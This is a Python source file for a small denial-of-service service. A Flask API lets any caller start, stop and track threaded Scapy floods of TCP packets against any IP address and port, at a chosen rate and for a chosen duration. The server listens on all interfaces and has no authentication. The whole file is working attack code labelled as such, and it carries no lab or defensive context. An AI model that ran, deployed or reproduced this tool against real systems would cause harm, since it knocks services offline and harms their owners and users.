from scapy.all import IP, TCP, send
from flask import Flask, request, jsonify
import threading, time, uuid

app = Flask(__name__)

active_attacks = {}

# -------------------------------
# ATTACK FUNCTIONS
# -------------------------------

def dos_attack(attack_id, target_ip, target_port, duration, rate):
    packet = IP(dst=target_ip)/TCP(dport=target_port)
    interval = 1 / rate
    end_time = time.time() + duration
    sent = 0

    while time.time() < end_time:
        if not active_attacks[attack_id]["running"]:
            break

        send(packet, verbose=0)
        sent += 1
        active_attacks[attack_id]["packets_sent"] = sent
        time.sleep(interval)

    active_attacks[attack_id]["running"] = False


# -------------------------------
# API ROUTES
# -------------------------------

@app.route("/attack/start", methods=["POST"])
def start_attack():
    data = request.json

    attack_id = str(uuid.uuid4())

    active_attacks[attack_id] = {
        "type": data["type"],
        "running": True,
        "packets_sent": 0,
        "rate": data["rate"]
    }

    thread = threading.Thread(
        target=dos_attack,
        args=(attack_id,
              data["ip"],
              int(data["port"]),
              int(data["duration"]),
              int(data["rate"]))
    )
    thread.start()

    return jsonify({"attack_id": attack_id})


@app.route("/attack/stop", methods=["POST"])
def stop_attack():
    attack_id = request.json["attack_id"]

    if attack_id in active_attacks:
        active_attacks[attack_id]["running"] = False

    return jsonify({"status": "stopped"})


@app.route("/attack/status/<attack_id>")
def status(attack_id):
    return jsonify(active_attacks.get(attack_id, {}))


# -------------------------------
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001)